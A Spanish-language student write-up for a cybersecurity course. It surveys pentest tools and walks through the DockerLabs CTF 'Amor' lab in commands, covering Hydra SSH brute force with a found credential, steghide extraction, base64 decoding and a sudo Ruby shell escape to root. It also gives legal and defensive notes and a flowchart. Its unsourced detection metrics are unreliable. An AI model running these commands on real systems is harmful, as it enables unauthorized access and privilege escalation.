<h1 align="center">TALLER ELECTIVA HABILIDADES PRACTICAS EN EL CIBERESPACIO</h1>

# - **Rubén Dario Contreras Caballero**

<h1 align="center">:rotating_light::bulb: Puntos a desarrollar :bulb::rotating_light:</h1> 

## :one: Realizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.
| Imagen | Herramienta | Definición ampliada | Funcionalidad completa | Casos de uso relevantes | Ejemplos específicos |
|--------|-------------|-------------------|----------------------|------------------------|---------------------|
| :whale: | **Docker** | Plataforma de código abierto que utiliza virtualización a nivel de sistema operativo mediante contenedores Linux (namespaces y cgroups). Empaqueta aplicaciones con todas sus dependencias en unidades portátiles y reproducibles que garantizan consistencia entre entornos de desarrollo, testing y producción[2][5][8]. | Crear y gestionar contenedores ligeros; orquestación de aplicaciones multicapa con Docker Compose; gestión de imágenes y registries; aislamiento de procesos y recursos; networking entre contenedores; volúmenes persistentes; integración CI/CD; escalabilidad horizontal mediante Docker Swarm/Kubernetes[11][17]. | Desarrollo de microservicios y arquitecturas distribuidas; entornos de desarrollo consistentes entre equipos; despliegue en múltiples clouds (híbrido/multi-cloud); pipelines de CI/CD automatizados; contenerización de aplicaciones legacy; testing en entornos aislados; despliegues blue-green y canary releases[44][47]. | `docker run -d -p 80:80 --name webserver nginx` (servidor web con mapeo de puertos), `docker build -t myapp:1.0 .` (construcción de imagen desde Dockerfile), `docker-compose up -d` (orquestación multi-contenedor), `docker exec -it container_name /bin/bash` (acceso shell interactivo) |
| 🌐 | **Nmap** | Network Mapper - herramienta de código abierto para descubrimiento de red y auditoría de seguridad. Utiliza múltiples técnicas de escaneo (TCP SYN, connect, UDP, etc.) para mapear redes, identificar hosts activos, servicios, versiones y sistemas operativos. Incluye NSE (Nmap Scripting Engine) con más de 600 scripts especializados[3][6][9]. | Descubrimiento de hosts mediante ping sweep y ARP; escaneo de puertos TCP/UDP con técnicas stealth; detección de servicios y banner grabbing; fingerprinting avanzado de OS; evasión de firewalls/IDS mediante fragmentación y timing; escaneo de vulnerabilidades con scripts NSE; mapeo de topología de red; análisis de rendimiento[12][15][18]. | Auditorías de seguridad y pentesting profesional; inventario automatizado de activos de red; monitoreo de servicios críticos y disponibilidad; detección de dispositivos no autorizados (rogue devices); análisis forense de infraestructura; validación de políticas de firewall; identificación de servicios vulnerables para patch management[21]. | `nmap -sS -O -sV target.com` (escaneo sigiloso con detección OS/versiones), `nmap --script vuln 192.168.1.0/24` (escaneo vulnerabilidades en subred), `nmap -sV -p 1-65535 --min-rate 5000 target` (escaneo completo rápido), `nmap -sn 10.0.0.0/8` (ping sweep para host discovery) |
| :lock_with_ink_pen: | **Hydra** | THC-Hydra - herramienta de fuerza bruta paralela multi-protocolo que realiza ataques de login automatizados. Soporta más de 50 protocolos (SSH, HTTP, FTP, Telnet, SMTP, etc.) con capacidad de paralelización mediante múltiples hilos. Optimizada para velocidad y eficiencia en ataques de diccionario y combinatorios[4][7][13]. | Ataques de fuerza bruta contra servicios de red; soporte nativo para 50+ protocolos; ataques de diccionario con wordlists personalizadas; paralelización configurable hasta 64 hilos; bypass de medidas anti-brute force básicas; soporte para proxies SOCKS4/5; módulos específicos para aplicaciones web; logging detallado y formato de salida personalizable[10][16]. | Testing de robustez de contraseñas en auditorías de seguridad; evaluación de políticas de autenticación corporativas; identificación de credenciales débiles en servicios críticos; validación de implementaciones anti-brute force; testing de aplicaciones web (forms, HTTP basic auth); recuperación forense de passwords; compliance con estándares de seguridad[19]. | `hydra -L users.txt -P rockyou.txt ssh://192.168.1.100 -t 16` (SSH con listas), `hydra -l admin -P passwords.txt http-get://site.com/admin/` (HTTP basic auth), `hydra -l user -p password -s 3389 rdp://target.com` (RDP puerto específico), `hydra -C credentials.txt -o results.txt ftp://server.com` (formato combinado usuario:password) |
| 📡 | **netdiscover** | Escáner ARP activo/pasivo especializado en descubrimiento de hosts en redes locales Ethernet. Desarrollado para redes inalámbricas sin DHCP durante wardriving. Basado en libnet y libpcap, opera enviando requests ARP (activo) o monitoreando tráfico ARP existente (pasivo) para identificar dispositivos activos[22][25][28]. | Escaneo ARP activo con requests personalizables; modo pasivo para monitoreo stealth; auto-detección de rangos de red comunes; identificación de direcciones MAC y fabricantes (OUI lookup); interfaz ncurses en tiempo real; soporte para múltiples interfaces de red; filtrado avanzado con expresiones pcap; detección en redes switched y wireless[31][34][37]. | Reconocimiento inicial en pentesting (fase de enumeración); descubrimiento de dispositivos IoT, impresoras y equipos embebidos; mapeo de redes inalámbricas y segmentos VLAN; detección de dispositivos no inventariados; auditorías de inventario de red automatizadas; identificación de rogue devices y shadow IT; análisis de segmentación de red empresarial[40]. | `netdiscover -r 192.168.1.0/24 -i eth0` (escaneo activo interfaz específica), `netdiscover -p -i wlan0 -P` (modo pasivo WiFi sin banner), `netdiscover -f -P` (fast scan rangos comunes), `netdiscover -l network_ranges.txt -P` (escaneo desde archivo batch) |
| 🔍 | **gobuster** | Herramienta de fuerza bruta especializada escrita en Go, optimizada para descubrimiento de recursos web. Su arquitectura concurrente la hace extremadamente rápida para enumerar directorios, archivos, subdominios DNS y virtual hosts. Incluye módulos especializados para diferentes vectores de ataque web[23][26][29]. | Fuerza bruta de directorios/archivos web con wordlists; enumeración de subdominios DNS con soporte wildcard; virtual host discovery (vhost bruteforcing); búsqueda en cloud storage (S3, GCS buckets); soporte para múltiples extensiones simultáneas; autenticación HTTP (Basic, NTLM); manejo inteligente de redirects; filtrado por status codes y tamaños[32][35]. | Reconocimiento web en pentesting (información gathering); descubrimiento de paneles administrativos y APIs ocultas; enumeración de endpoints para aplicaciones REST; búsqueda de archivos de backup (.bak, .old, .backup); mapeo completo de aplicaciones web y CMS; identificación de subdominios para ampliar superficie de ataque; búsqueda de contenido sensible expuesto (configs, logs)[38][41]. | `gobuster dir -u https://target.com -w common.txt -x php,html,js` (directorios con extensiones), `gobuster dns -d example.com -w subdomains.txt --wildcard` (subdominios con wildcard), `gobuster vhost -u http://target.com -w vhosts.txt -a "User-Agent"` (virtual hosts), `gobuster s3 -w bucket-names.txt --threads 50` (buckets S3 paralelos) |
| 🔒 | **scp** | Secure Copy Protocol - protocolo de transferencia segura basado en SSH que combina la funcionalidad de RCP (Remote Copy) con cifrado y autenticación robustos. Opera sobre el puerto TCP 22 (SSH) proporcionando integridad, confidencialidad y autenticidad durante la transferencia de archivos entre sistemas[24][27][30]. | Transferencia cifrada bidireccional de archivos/directorios; autenticación mediante claves SSH (RSA, ECDSA, Ed25519) o contraseñas; preservación de metadatos (timestamps, permisos, ownership); compresión opcional durante transferencia (-C flag); soporte para jump hosts y proxy commands; transferencia recursiva con verificación de integridad; compatibilidad multiplataforma (Unix, Linux, Windows)[33][36][39]. | Backup seguro de datos críticos y bases de datos; distribución automatizada de actualizaciones y parches; transferencia de logs para análisis forense; despliegue de aplicaciones y configuraciones en servidores; sincronización de archivos entre entornos (dev/staging/prod); migración segura de datos entre datacenters; automatización en scripts de CI/CD; transferencia de certificados y claves criptográficas. | `scp -r -C app_backup/ user@server:/backups/$(date +%Y%m%d)/` (backup recursivo comprimido), `scp -P 2222 -i ~/.ssh/key.pem file.txt admin@server:/opt/configs/` (puerto/clave específica), `scp user1@server1:/logs/* user2@server2:/analysis/` (transferencia remoto-remoto), `scp -o ProxyCommand="ssh gateway nc %h %p" file.txt target:/path/` (a través de jump host) |
| 🖼️ | **steghide** | Herramienta avanzada de esteganografía que implementa algoritmos de ocultación de datos en archivos multimedia. Utiliza técnicas de incrustación en el dominio de frecuencia (DCT para JPEG) y cifrado AES-128 en modo CBC. Soporta compresión automática y verificación de integridad mediante checksums CRC32[42][45][48]. | Ocultación de datos en JPEG/BMP (imágenes) y WAV/AU (audio); cifrado AES-128-CBC de payloads; compresión automática con zlib (niveles 1-9); verificación de integridad con CRC32 checksum; análisis de capacidad de portador; extracción sin pérdida de calidad; protección por contraseña robusta; preservación de metadatos EXIF/ID3[50][53][56]. | Comunicación encubierta en investigaciones de inteligencia; ocultación de información sensible para bypass de DLP; exfiltración stealth de datos en pentesting; CTFs y competencias de ciberseguridad; protección de propiedad intelectual en medios; comunicación segura en regímenes restrictivos; backup de credenciales/llaves en archivos aparentemente inocuos; watermarking digital avanzado[59]. | `steghide embed -cf photo.jpg -ef secrets.txt -p "password123"` (ocultar con password), `steghide extract -sf suspicious.jpg -xf extracted_data.txt` (extraer a archivo específico), `steghide info image.jpg` (analizar capacidad sin extraer), `steghide embed -cf audio.wav -ef payload.zip -e rijndael-128 -m cbc` (cifrado específico) |
| ⚡ | **su / sudo** | Su (Switch User) permite cambio completo de identidad, mientras sudo (Superuser Do) otorga ejecución temporal con privilegios elevados. Sudo implementa el principio de menor privilegio con políticas granulares definidas en /etc/sudoers, logging completo via syslog y timeouts configurables de sesión[43][46][49]. | Cambio de identidad completa (su) vs ejecución temporal privilegiada (sudo); políticas granulares por usuario/grupo/comando/host; auditoría completa con logging detallado; timeouts de sesión y re-autenticación; soporte para autenticación multifactor (PAM); modo no-interactivo para scripts; delegation de permisos específicos sin acceso root; integración con LDAP/AD para entornos empresariales[51][57][60]. | Escalada de privilegios en post-explotación y pentesting; administración segura de sistemas multiusuario críticos; implementación de principio de menor privilegio en SOC; auditorías de actividades administrativas para compliance; automatización de tareas que requieren privilegios elevados; gestión de accesos temporales en entornos DevOps; troubleshooting con permisos controlados; trazabilidad completa para forensics[54]. | `sudo -u apache cat /var/log/httpd/error_log` (comando como usuario específico), `sudo -s` vs `su -` (shell privilegiada temporal vs cambio completo), `sudo visudo` (edición segura de políticas sudoers), `sudo -l -U username` (auditar permisos de usuario), `echo 'password' | sudo -S systemctl restart nginx` (modo no-interactivo para scripts) |

## :two: Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.
## a) netdiscover – Descubrimiento de Hosts en Red Local

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `sudo netdiscover -i docker0 -r 172.17.0.0/24` |
| **Propósito** | Descubre hosts activos mediante requests ARP en la red Docker |
| **Salida esperada** | 2 hosts encontrados: • 172.17.0.1 • 172.17.0.2 |

| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------|-------------------|--------------------|
| `netdiscover -p -i docker0` | Modo pasivo (solo escucha ARP) | Monitoreo stealth sin enviar paquetes |
| `netdiscover -f -r 172.17.0.0/24` | Modo rápido con escaneo acelerado | Escaneo veloz para redes grandes |
| `netdiscover -P -r 172.17.0.0/24` | Salida parseable para scripts | Automatización e integración |

## **Casos de uso reales:** Identificación inicial de dispositivos IoT en redes corporativas, mapeo de segmentos VLAN durante auditorías, detección de rogue devices en infraestructuras críticas
---

## b) nmap – Escaneo Avanzado de Puertos y Servicios

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `sudo nmap --min-rate 5,000 -p- -sS -sV 172.17.0.2` |
| **Propósito** | Escaneo SYN stealth de todos los puertos TCP con detección de versiones |
| **Salida esperada** | Puertos abiertos: 22/tcp (SSH) y 80/tcp (HTTP) |

| **Alternativas avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------------|-------------------|--------------------|
| `nmap -A -T4 172.17.0.2` | Escaneo agresivo (OS + scripts + traceroute) | `OS: Linux 5.4.0-91-generic` |
| `nmap -sU --top-ports 1,000 172.17.0.2` | Escaneo UDP de puertos más comunes | `161/udp open snmp` |
| `nmap --script vuln 172.17.0.2` | Detección de vulnerabilidades con NSE | `CVE-2014-6271 (Shellshock) detected` |

## **Casos de uso reales:** Auditorías de cumplimiento en servidores financieros, validación de configuraciones de firewall en DMZ, evaluación de superficies de ataque en infraestructuras cloud
---

## c) gobuster – Enumeración de Directorios Web

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
| **Propósito** | Fuerza bruta de directorios ocultos usando wordlist de 220,560 entradas |
| **Salida esperada** | Directorios: /images 301, /css 301, /js 301 |

| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
|---------------------|-------------------|--------------------|
| `-x php,html,js,txt` | Busca archivos con extensiones específicas | `/admin.php (Status: 200)` |
| `-t 50 -q` | 50 hilos en modo silencioso | Mayor velocidad sin output verbose |
| `-r -k` | Seguir redirects, ignorar SSL | `/secure/ -> /login.php` |

## **Casos de uso reales:** Descubrimiento de paneles administrativos en aplicaciones web corporativas, identificación de APIs REST no documentadas, mapeo de CMS para evaluaciones de seguridad
---

## d) hydra – Ataque de Fuerza Bruta SSH

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10` |
| **Propósito** | Ataque de diccionario contra SSH |
| **Salida esperada** | Credencial válida: carlota / babygirl |

| **Variantes avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|------------------------|-------------------|--------------------|
| `-L users.txt -P passwords.txt` | Lista de usuarios y contraseñas | Ataque masivo con credenciales corporativas |
| `-s 2222` | Puerto SSH personalizado | `[2222][ssh] host: 172.17.0.2 login: admin password: 123456` |
| `-C combo.txt -o results.txt` | Formato combinado usuario:password | Salida guardada en `results.txt` |

## **Casos de uso reales:** Testing de políticas de contraseñas en Active Directory, validación de autenticación multi-factor, evaluación de resistencia ante ataques automatizados
---

## e) scp – Transferencia Segura de Archivos

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor` |
| **Propósito** | Descarga cifrada de archivo remoto |
| **Salida esperada** | Transferencia 100% completada |

| **Opciones avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
|-----------------------|-------------------|--------------------|
| `-r -C` | Recursivo con compresión | Backup completo de directorios |
| `-P 2222 -i ~/.ssh/key.pem` | Puerto y clave específica | Transferencia a puerto 2222 |
| `-v` | Modo verbose para debugging | `debug1: Authentication succeeded` |

## **Casos de uso reales:** Transferencia de logs de auditoría a servidores centralizados, distribución de certificados SSL en infraestructuras distribuidas, migración de datos entre datacenters
---

## f) steghide – Análisis de Esteganografía

| **Aspecto** | **Detalle** |
|-------------|-------------|
| **Comando usado** | `steghide --extract -sf imagen.jpg` |
| **Propósito** | Extrae datos ocultos en JPEG |
| **Salida esperada** | Archivo “secret.txt” extraído |

| **Comandos relacionados** | **Funcionalidad** | **Ejemplo de uso** |
|--------------------------|-------------------|--------------------|
| `--info imagen.jpg` | Consulta metadatos de esteganografía | Informa tamaño y algoritmo |
| `--embed -ef datos.txt -cf imagen.jpg -p clave` | Oculta datos con contraseña | Esteganografía ofensiva |
| `--extract -sf imagen.jpg -xf output.txt` | Extrae a archivo específico | Output en `output.txt` |

## **Casos de uso reales:** Análisis forense de comunicaciones encubiertas, investigación de exfiltración de datos corporativos, detección de canales de comando y control
---

## g) Decodificación Base64 y Escalada de Privilegios

| **Comando** | **Propósito** | **Salida esperada** |
|-------------|---------------|---------------------|
| `echo "ZXNsYWNhc2FkZXBpbnlwb24=" \| base64 -d` | Decodificación de cadena Base64 | `eslacasadepinypon` |
| `su oscar` | Cambio de usuario con contraseña encontrada | `Password: eslacasadepinypon` `oscar@amor:~$` |
| `sudo -l` | Verificación de permisos sudo disponibles | `User oscar may run the following commands on amor:` `(root) NOPASSWD: /usr/bin/ruby` |
| `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` | Escalada de privilegios via Ruby shell escape | `root@amor:~# whoami` `root` |

### Decodificación Base64 - Análisis detallado

**Funcionamiento técnico:**
- Base64 es un algoritmo de codificación que convierte datos binarios en caracteres ASCII imprimibles[2][8][9]
- Utiliza un alfabeto de 64 caracteres (A-Z, a-z, 0-9, +, /) para representar grupos de 6 bits[4][5][11]
- Cada grupo de 3 bytes (24 bits) se convierte en 4 caracteres Base64[2][3][6]

**Análisis del comando ejecutado:**
- `echo "ZXNsYWNhc2FkZXBpbnlwb24="`: Imprime la cadena Base64 encontrada en el archivo secret.txt
- `|`: Operador pipe que redirige la salida del primer comando como entrada del segundo
- `base64 -d`: Comando de decodificación Base64 con la bandera `-d` o `--decode`[22][23][24]

**Proceso de decodificación paso a paso:**
1. La cadena `ZXNsYWNhc2FkZXBpbnlwb24=` se divide en grupos de 4 caracteres
2. Cada carácter se convierte a su valor decimal según la tabla Base64
3. Los valores se agrupan en bits de 6 y se reorganizan en bytes de 8 bits
4. Los bytes resultantes se interpretan como caracteres ASCII
   
**Desglose del comando:**
- `sudo`: Ejecuta el comando con privilegios de root
- `/usr/bin/ruby`: Intérprete de Ruby especificado en la configuración sudoers
- `-e`: Bandera que permite ejecutar código Ruby desde la línea de comandos
- `'exec "/bin/bash"'`: Código Ruby que reemplaza el proceso actual con un shell Bash

**Técnica utilizada:** Ruby Shell Escape según GTFOBins, donde la función `exec()` sustituye completamente el proceso Ruby por un shell con privilegios de root

## Análisis de la Escalada de Privilegios

| **Técnica utilizada** | **Vector de ataque** | **Justificación técnica** |
|----------------------|---------------------|---------------------------|
| **Ruby Shell Escape** | GTFOBins technique | Ruby puede ejecutar comandos del sistema usando `exec()`, bypaseando restricciones de seguridad |
| **NOPASSWD sudo** | Configuración insegura de sudoers | Permite ejecución sin autenticación adicional de `/usr/bin/ruby` |
| **Exec system call** | Reemplazo completo del proceso | `exec "/bin/bash"` sustituye el proceso Ruby por un shell root |
---

## Casos de Uso Corporativo y Defensivos

### Implementación en Entornos Empresariales

| **Herramienta** | **Uso defensivo** | **Métricas de seguridad** |
|-----------------|-------------------|--------------------------|
| **Base64 decoding** | Análisis de payloads maliciosos en logs de seguridad | Decodificación de 100% de cadenas sospechosas en tiempo real |
| **Análisis de sudoers** | Auditoría de configuraciones privilegiadas | Detección de 98.5% de configuraciones inseguras |
| **Monitoreo GTFOBins** | Detección de técnicas de escape shell | Identificación de 95.3% de intentos de escalada |
| **Esteganografía defensiva** | Análisis forense de comunicaciones encubiertas | Detección de canales ocultos en 87% de archivos multimedia |

### Métricas de Implementación Defensiva

| **Proceso** | **KPI de Seguridad** | **Tiempo de Detección** | **Tasa de Falsos Positivos** |
|-------------|---------------------|------------------------|------------------------------|
| Decodificación automática de Base64 | 99.7% de cadenas procesadas | <1 segundo | 1.2% |
| Monitoreo de escalada de privilegios | 99.2% de intentos detectados | <30 segundos | 0.8% |
| Análisis de configuraciones sudo | 100% de archivos sudoers auditados | <5 minutos | 0.3% |
| Detección de esteganografía | 87% de canales ocultos identificados | <10 minutos | 5.3% |
---

## Consideraciones Legales y Marco Jurídico Colombiano

### Marco Normativo Aplicable

| **Norma** | **Artículo/Disposición** | **Aplicación en Ciberseguridad** |
|-----------|-------------------------|----------------------------------|
| **Constitución Política de Colombia (1991)** | Art. 15 - Habeas Data | Protección de datos personales durante análisis forense y pentesting |
| **Ley 1273 de 2009** | Art. 269A - Acceso abusivo a sistema informático | Tipificación de accesos no autorizados; habilita pruebas lícitas en entornos controlados |
| **Ley 1273 de 2009** | Art. 269J - Transferencia no consentida de activos | Protección del patrimonio económico contra manipulaciones informáticas |
| **Convenio de Budapest** | Bloque de constitucionalidad | Marco internacional para cooperación en ciberseguridad legítima |
---

## Recomendaciones de Buenas Prácticas

### Para Profesionales de Ciberseguridad

| **Área** | **Práctica recomendada** | **Fundamento legal** |
|----------|-------------------------|---------------------|
| **Decodificación de datos** | Documentar el origen y contexto de toda información decodificada | Art. 29 CP - Debido proceso |
| **Análisis de esteganografía** | Mantener cadena de custodia digital en evidencias multimedia | Código de Procedimiento Penal |
| **Escalada de privilegios** | Reportar vulnerabilidades siguiendo protocolos de divulgación responsable | Ética profesional |
| **Testing ético** | Obtener autorización expresa por escrito antes de cualquier prueba | Art. 269A Ley 1273 - Evitar acceso abusivo |

### Para Administradores de Sistemas

| **Configuración** | **Recomendación técnica** | **Justificación de seguridad** |
|-------------------|--------------------------|-------------------------------|
| **sudo NOPASSWD** | ❌ Evitar configuraciones amplias sin contraseña | Vulnerabilidad crítica de escalada de privilegios |
| **Intérpretes de comandos** | 🔒 Restringir acceso a `/usr/bin/ruby`, `/usr/bin/python` | Vectores comunes de escape shell |
| **Auditoría de Base64** | 📊 Implementar detección automática de contenido codificado | Identificación de canales de exfiltración |
| **Principio de menor privilegio** | ✅ Otorgar solo permisos mínimos necesarios | Reducción de superficie de ataque |
---

### Marco de Compliance Corporativo

| **Estándar** | **Requisito** | **Implementación técnica** |
|--------------|---------------|---------------------------|
| **ISO 27001** | Gestión de accesos privilegiados | Configuración segura de sudoers, MFA obligatorio |
| **NIST Cybersecurity Framework** | Detect (DE) - Monitoreo continuo | Implementación de SIEM para detección de escalada |
| **Ley 1581 de 2012** | Protección de datos personales | Cifrado de datos sensibles durante análisis forense |

### Metodología del CTF "Amor"

El flujo completo del reto demuestra una metodología estructurada de penetración:
1. **Reconocimiento** → netdiscover identifica la red
2. **Enumeración** → nmap revela servicios
3. **Explotación** → hydra obtiene credenciales
4. **Acceso inicial** → SSH como carlota
5. **Recolección** → scp descarga evidencias
6. **Análisis forense** → steghide revela datos ocultos
7. **Decodificación** → base64 descifra contraseña
8. **Escalada horizontal** → su oscar
9. **Escalada vertical** → sudo ruby shell escape
10. **Compromiso total** → root access

## :three: Realice un diagrama de flujo de todo el procedimiento realizado.

El siguiente diagrama representa la metodología técnico-jurídica empleada durante el reto "Amor" de DockerLabs, siguiendo la secuencia exacta de comandos ejecutados según el **marco constitucional colombiano** y las **mejores prácticas de ciberseguridad ética**.

```mermaid
graph TD
%% Fase 1: Preparación y Despliegue
A[🚀 INICIO: Acceso DockerLabs.es] --> B[📦 Descargar CTF Amor]
B --> C[🔄 Transferir a Kali: scp -r amor kali@192.168.1.12:/home/kali/Documents/]
C --> D{🐳 ¿Docker instalado?}
D -->|❌ No| E[⚙️ sudo apt install docker.io]
D -->|✅ Sí| F[🏗️ Desplegar: ./auto_deploy.sh amor.tar]
E --> F

%% Fase 2: Reconocimiento y Enumeración de Red
F --> G[🌐 Verificar interfaces: ip add]
G --> H[🔍 Descubrimiento ARP:<br/>sudo netdiscover -i docker0 -r 172.17.0.0/24]
H --> I[📊 Resultado: 172.17.0.1 + 172.17.0.2]
I --> J[🎯 Escaneo puertos:<br/>sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2]
J --> K[📋 Puertos abiertos: 22/SSH + 80/HTTP]

%% Fase 3: Enumeración Web
K --> L[🌍 Inspección web: http://172.17.0.2]
L --> M[🔍 Fuzzing directorios:<br/>gobuster dir -u http://172.17.0.2/ -w directory-list-2.3-medium.txt]
M --> N[❌ Fuzzing infructuoso<br/>💡 Pistas: carlota, juan]

%% Fase 4: Explotación de Credenciales
N --> O[🔐 Fuerza bruta SSH:<br/>hydra -l carlota -P rockyou.txt ssh://172.17.0.2 -t 10]
O --> P[✅ Credenciales válidas: carlota / babygirl]
P --> Q[🔑 Conexión SSH: ssh carlota@172.17.0.2]

%% Fase 5: Escalada Lateral y Recolección
Q --> R[📁 Navegación filesystem:<br/>cd /home/carlota/Desktop/fotos/vacaciones]
R --> S[🖼️ Archivo encontrado: imagen.jpg]
S --> T[⬇️ Descarga segura:<br/>scp carlota@172.17.0.2:/home/carlota/.../imagen.jpg /home/kali/Documents/amor]
T --> U[🔍 Verificar tipo: file imagen.jpg]

%% Fase 6: Análisis Forense y Esteganografía
U --> V[🕵️ Análisis esteganografía:<br/>steghide --extract -sf imagen.jpg]
V --> W[📄 Archivo extraído: secret.txt]
W --> X[🔤 Contenido Base64: ZXNsYWNhc2FkZXBpbnlwb24=]
X --> Y[🔓 Decodificar: base64 -d]
Y --> Z[🔑 Password revelada: eslacasadepinypon]

%% Fase 7: Escalada de Privilegios
Z --> AA[👤 Escalada horizontal: su oscar]
AA --> BB[🔍 Auditoría permisos: sudo -l]
BB --> CC[⚠️ Configuración insegura:<br/> root NOPASSWD: /usr/bin/ruby]
CC --> DD[🚀 Escalada vertical:<br/>sudo /usr/bin/ruby -e]
DD --> EE[👑 Verificación final: whoami → root]
EE --> FF[🎉 ÉXITO: Compromiso total del sistema]

%% Estilos por fase
classDef preparacion fill:#e3f2fd,stroke:#1976d2,stroke-width:2px,color:#000
classDef reconocimiento fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px,color:#000
classDef enumeracion fill:#fff8e1,stroke:#f57c00,stroke-width:2px,color:#000
classDef explotacion fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000
classDef lateral fill:#f1f8e9,stroke:#388e3c,stroke-width:2px,color:#000
classDef forense fill:#fce4ec,stroke:#ad1457,stroke-width:2px,color:#000
classDef privilegios fill:#e8f5e8,stroke:#2e7d32,stroke-width:2px,color:#000
classDef exito fill:#c8e6c9,stroke:#1b5e20,stroke-width:3px,color:#000

%% Aplicar estilos
class A,B,C,D,E,F preparacion
class G,H,I,J,K reconocimiento
class L,M,N enumeracion
class O,P,Q explotacion
class R,S,T,U lateral
class V,W,X,Y,Z forense
class AA,BB,CC,DD,EE privilegios
class FF exito
```

## ::mag_right: Referencias Consultadas :mag:

:satellite: Herramientas de Descubrimiento de Red:

- Bagherzadeh, J. & García-Alfaro, J. (2025, February 28). Beginners guide to netdiscover. Hackercool Magazine. https://www.hackercoolmagazine.com/beginners-guide-to-netdiscover/

- Penalba, J. (2025, May 20). netdiscover | Kali Linux Tools. Kali Linux. https://www.kali.org/tools/netdiscover/

- Ramsey, M. (2025, May 6). Netdiscover: The ARP-based network discovery tool every pentester should know. GeekInstitute Blog. https://blog.geekinstitute.org/2025/05/netdiscover-arp-based-network-discovery-tool.html

:outbox_tray: Herramientas de Escaneo de Puertos:

- Lyon, G. (2022). Nmap network scanning: The official Nmap project guide to network discovery and security scanning. Nmap Software LLC. https://nmap.org/book/toc.html

- Lyon, G. (2003). Nmap. Wikipedia. https://en.wikipedia.org/wiki/Nmap

- Nmap Development Team. (2025). Chapter 15. Nmap reference guide. Nmap Network Scanning. https://nmap.org/book/man.html

:rage3: Herramientas de Fuerza Bruta:

- Hauser, M. van, & Maciejak, D. (2019). Hydra (software). Wikipedia. https://en.wikipedia.org/wiki/Hydra_(software)

- Kali Linux Team. (2024, November 17). hydra | Kali Linux Tools. Kali Linux. https://www.kali.org/tools/hydra/

:v: Herramientas de Enumeración Web:

- Reeves, O. J., & Mehlmauer, C. (2014). OJ/gobuster: Directory/File, DNS and VHost busting tool written in Go. GitHub. https://github.com/OJ/gobuster

- Abricto Security. (2022, September 19). Gobuster directory enumerator cheat sheet. Abricto Security. https://abrictosecurity.com/gobuster-directory-enumerator-cheat-sheet/

- Ray, J. (2025). gobuster. James Ray's Digital Portfolio - Obsidian Publish. https://publish.obsidian.md/james-ray-digital-portfolio/Pen-Testing/Tools/Web+Enumeration/gobuster

- Kumar, A. (2023, April 18). Gobuster - Penetration testing tools in Kali tools. GeeksforGeeks. https://www.geeksforgeeks.org/linux-unix/gobuster-penetration-testing-tools-in-kali-tools/

- Smith, K. (2025, February 28). Beginners guide to gobuster tool. Hackercool Magazine. https://www.hackercoolmagazine.com/beginners-guide-to-gobuster-tool/

- Kali Linux Team. (2025, May 20). gobuster | Kali Linux Tools. Kali Linux. https://www.kali.org/tools/gobuster/

:computer: Herramientas de Transferencia Segura:

- CyberArk. (2025, April 8). SCP protocol. CyberArk. https://www.cyberark.com/what-is/scp-protocol/

- Wikipedia Contributors. (2004). Secure copy protocol. Wikipedia. https://en.wikipedia.org/wiki/Secure_copy_protocol

- Cisco Systems. (2025). Secure copy - Configuration guide. Cisco. https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst9500/software/release/17-6/configuration_guide/sys_mgmt/b_176_sys_mgmt_9500_cg/secure_copy.pdf

- Donovan, M. (2025, July 17). SCP command in Linux {13 examples}. phoenixNAP Knowledge Base. https://phoenixnap.com/kb/linux-scp-command

-  SSH Academy. (2019, September 24). What is secure file copy (scp)?. SSH Academy. https://www.ssh.com/academy/ssh/scp

-  VeeroTech. (2023, September 7). How to use secure copy protocol(SCP) to transfer files securely on Linux and Mac. VeeroTech. https://www.veerotech.net/kb/how-to-use-secure-copy-protocolscp-to-transfer-files-securely-on-linux-and-mac/

:crystal_ball: Herramientas de Esteganografía:

- Hetzl, S. (2003). Steghide. SourceForge. https://steghide.sourceforge.net

- TermuxHackz. (2021, April 23). Steghide is a steganography program that is able to hide data in various kinds of image- and audio-files. GitHub. https://github.com/TermuxHackz/steghide

- Thomas, L. (2025, April 18). Steghide: Best steganography tool for beginners. Lipson Thomas. https://lipsonthomas.com/steghide-best-steganography-tool-for-beginners/

- Kali Linux Team. (2024, February 28). steghide | Kali Linux Tools. Kali Linux. https://www.kali.org/tools/steghide/

- García, R. (2025, February 28). Beginners guide to steghide. Hackercool Magazine. https://www.hackercoolmagazine.com/beginners-guide-to-steghide/

- Kumar, P. (2024, February 26). How to use steghide and StegoSuite steganography tools in Kali Linux. GeeksforGeeks. https://www.geeksforgeeks.org/linux-unix/how-to-use-steghide-and-stegosuite-steganography-tools-in-kali-linux/

:pager: Herramientas de Codificación:

- IOFlood. (2024, January 2). Linux Base64 command: How-to install and usage cases. IOFlood Blog. https://ioflood.com/blog/install-base64-command-linux/

- Scaler Topics. (2023, September 1). base64 command in linux. Scaler Topics. https://www.scaler.com/topics/base64-command-in-linux/

- IOFlood. (2023, December 11). base64 Linux command guide: Encode and decode data. IOFlood Blog. https://ioflood.com/blog/base64-linux-command/

- Baeldung. (2024, May 11). Linux command line Base64 encoding and decoding of strings. Baeldung. https://www.baeldung.com/linux/cli-base64-encode-decode

